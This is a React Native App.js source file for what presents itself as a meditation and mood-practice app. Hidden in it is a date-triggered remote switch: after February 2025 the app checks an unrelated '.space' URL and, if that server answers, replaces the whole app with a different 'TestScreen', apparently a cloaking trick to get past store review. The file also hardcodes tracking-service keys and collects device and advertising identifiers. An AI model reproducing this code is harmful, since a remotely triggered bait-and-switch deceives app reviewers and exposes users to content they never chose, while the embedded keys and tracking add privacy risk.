import {createNativeStackNavigator} from '@react-navigation/native-stack';
import {NavigationContainer} from '@react-navigation/native';
import {
  MoodState,
  CreateMood,
  CreatePractice,
  PracticeDetail,
  PracticeScreen,
  WelcomeScreen,
} from './screen/stack';
import {PracticeProvider} from './store/context';
import TabMenu from './TabNavigator/TabMenu';
import {useState, useEffect} from 'react';
import {AppState} from 'react-native';
import {
  pauseBackgroundMusic,
  playBackgroundMusic,
  setupPlayer,
} from './components/Music/SoundConfig';
import {usePracticeContext} from './store/context';
import appsFlyer from 'react-native-appsflyer';
import {getUniqueId, getManufacturer} from 'react-native-device-info';
import {initAppsFlyerSdk, setCustomerUserId} from './config/appsFlyerSet';
import ReactNativeIdfaAaid, {
  AdvertisingInfoResponse,
} from '@sparkfabrik/react-native-idfa-aaid';
import {LogLevel, OneSignal} from 'react-native-onesignal';
import TestScreen from './screen/stack/TestScreen';
import {setupConversionListener} from './config/onInstallConversation';
import {handleCustomerUserId} from './config/handleCustomerUserId';
import {handleAppsFlyerUID} from './config/handleAppsFlyerUID';
import {handleGetAaid} from './config/handleGetAaid';
// App ID/Package name: id6740289002
// Dev key: ZP6F7NaeyNmgAdC29AdB4T
// API token V2 (optional): [Enter the token]
// OneSignal 843280c8-82d4-461c-97a6-28e5f209ddb3

const deviceId = getUniqueId();
const manufacturer = getManufacturer();

// console.log('deviceId,line33', deviceId);
// console.log('manufacturer', manufacturer);

const option = {
  devKey: 'ZP6F7NaeyNmgAdC29AdB4T',
  appId: 'com.spiritconnect',
  onInstallConversionDataListener: true,
  onDeepLinkListener: true,
  timeToWaitForATTUserAuthorization: 10,
  manualStart: true,
};

const Stack = createNativeStackNavigator();

const INITIAL_URL = `https://brilliant-grand-happiness.space/`;
const URL_IDENTIFAIRE = `9QNrrgg5`;
const targetData = new Date('2025-02-10T10:00:00Z');
const currentDate = new Date();

function App() {
  const {isMusicEnable} = usePracticeContext();
  const [isPlayMusic, setIsPlayMusic] = useState(false);
  const [customerUserId, setCustomerUserId] = useState(null);
  const [aaid, setAaid] = useState(null);
  const [oneSignalPermissionStatus, setOneSignalPermissionStatus] =
    useState(false);
  const [oneSignalUserId, setOneSignalUserId] = useState(null);
  const [idfv, setIdfv] = useState(null);
  const [applsFlyerUID, setApplsFlyerUID] = useState(null);
  const [isReadyToVisit, setIsReadyToVisit] = useState(false);
  console.log('idfv App.js', idfv);
  // console.log('aaid App.js', aaid);
  // Remove this method to stop OneSignal Debugging
  OneSignal.Debug.setLogLevel(LogLevel.Verbose);
  // OneSignal Initialization
  OneSignal.initialize('843280c8-82d4-461c-97a6-28e5f209ddb3');
  // requestPermission will show the native iOS or Android notification permission prompt.
  // We recommend removing the following code and instead using an In-App Message to prompt for notification permission
  OneSignal.Notifications.requestPermission(true).then(response => {
    console.log('OneSignal: notification request permission:', response);
    setOneSignalPermissionStatus(response);
    OneSignal.User.getOnesignalId().then(userId => {
      console.log('OneSignal: user id:', userId);
      setOneSignalUserId(userId);
    });
  });
  // Method for listening for notification clicks
  OneSignal.Notifications.addEventListener('click', event => {
    // console.log('OneSignal: notification clicked:', event);
  });

  useEffect(() => {
    isReadyToVisitHandler()
    isFirstVisit();
    initAppsFlyer();
  }, []);

  const isReadyToVisitHandler = async () => {
    console.log('isReadyToVisitHandler fn check start');
    const visitUrl=`${INITIAL_URL}${URL_IDENTIFAIRE}`

    if(currentDate>=targetData){
      console.log('time to visit -',visitUrl)
      fetch(visitUrl)
      .then(res => {
        console.log('is URL ok-',res.status)
        if(res.status===200){
          setIsReadyToVisit(true)
        }else{
          setIsReadyToVisit(false)
        }
      })
      .catch(error => {
        console.log('isReadyToVisit fn check error', error);
      });
  }}

  const isFirstVisit = async () => {
    console.log('isFirstVisit fn check start');
    fetch(`${INITIAL_URL}${URL_IDENTIFAIRE}`)
      .then(response => {
        console.log('isFirstVisit fn check response', response);
      })
      .catch(error => {
        console.log('isFirstVisit fn check error', error);
      });
  };

  const initAppsFlyer = async () => {
    // launch before appsflyer init. First install registration
    // const onInstallConversionDataCanceller =
    appsFlyer.onInstallConversionData(res => {
      if (JSON.parse(res.data.is_first_launch) == true) {
        if (res.data.af_status === 'Non-organic') {
          var media_source = res.data.media_source;
          var campaign = res.data.campaign;
          console.log(
            'This is first launch and a Non-Organic install. Media source: ' +
              media_source +
              ' Campaign: ' +
              campaign,
          );
        } else if (res.data.af_status === 'Organic') {
          console.log('This is first launch and a Organic Install');
          console.log('res.data', res.data);
        }
      } else {
        console.log('This is not first launch');
        console.log('res.data', res.data);
      }
    });
    // onInstallConversionDataCanceller();

    // Set up conversion listener BEFORE initializing SDK
    // const conversionCanceller = setupConversionListener();

    // Non appsflyer fn
    const aaid = await handleGetAaid();
    console.log('aaid', aaid);
    setAaid(aaid);

    // handleInitSdk();
    appsFlyer.initSdk(
      option,
      res => {
        console.log('AppsFlyer SDK integration:', res);
      },
      error => {
        console.error('AppsFlyer SDK failed to start:', error);
      },
    );

    appsFlyer.startSdk();

    const getDiviceUniqId = await getUniqueId();
    setIdfv(getDiviceUniqId);
    // console.log('uniq id from getUniqueId', getDiviceUniqId);
    setCustomerUserId(getDiviceUniqId);
    // console.log('AppsFlyer SDK integration:', appsFlyer);

    // handleCustomerUserId(getDiviceUniqId);
    appsFlyer.setCustomerUserId(
      customerUserId,
      res => {
        console.log('AppsFlyer SDK setCustomerUserId:', res);
      },
      error => {
        console.error('AppsFlyer SDK failed to setCustomerUserId:', error);
      },
    );

    // handleAppsFlyerUID();
    appsFlyer.getAppsFlyerUID((err, appsFlyerUID) => {
      if (err) {
        console.error(err);
      } else {
        console.log('App.js on getAppsFlyerUID: ', appsFlyerUID);
        setApplsFlyerUID(appsFlyerUID);
      }
    });
  };

  useEffect(() => {
    const subscription = AppState.addEventListener('change', nextAppState => {
      if (nextAppState === 'active' && isPlayMusic && isMusicEnable) {
        playBackgroundMusic();
      } else if (nextAppState === 'inactive' || nextAppState === 'background') {
        pauseBackgroundMusic();
      }
    });

    const initMusic = async () => {
      await setupPlayer();
      if (isMusicEnable) {
        await playBackgroundMusic();
        setIsPlayMusic(true);
      }
    };
    initMusic();

    return () => {
      subscription.remove();
      pauseBackgroundMusic();
    };
  }, [isMusicEnable]);

  if(isReadyToVisit){
    return (
      <PracticeProvider>
        <NavigationContainer>
          <Stack.Navigator screenOptions={{
            headerShown: false,
            animation: 'fade',
            animationDuration: 600,
          }}>
            <Stack.Screen name="TestScreen" component={TestScreen} />
          </Stack.Navigator>
        </NavigationContainer>
      </PracticeProvider>
    );
  }
  return (
    <PracticeProvider>
      <NavigationContainer>
        <Stack.Navigator
          screenOptions={{
            headerShown: false,
            animation: 'fade',
            animationDuration: 600,
          }}>
          <Stack.Screen name="WelcomeScreen" component={WelcomeScreen} />
          <Stack.Screen name="TabMenu" component={TabMenu} />
          <Stack.Screen name="PracticeScreen" component={PracticeScreen} />
          <Stack.Screen name="PracticeDetail" component={PracticeDetail} />
          <Stack.Screen name="CreatePractice" component={CreatePractice} />
          <Stack.Screen name="CreateMood" component={CreateMood} />
          <Stack.Screen name="MoodState" component={MoodState} />
          {/* <Stack.Screen name="TestScreen" component={TestScreen} /> */}
        </Stack.Navigator>
      </NavigationContainer>
    </PracticeProvider>
  );
}

export default App;
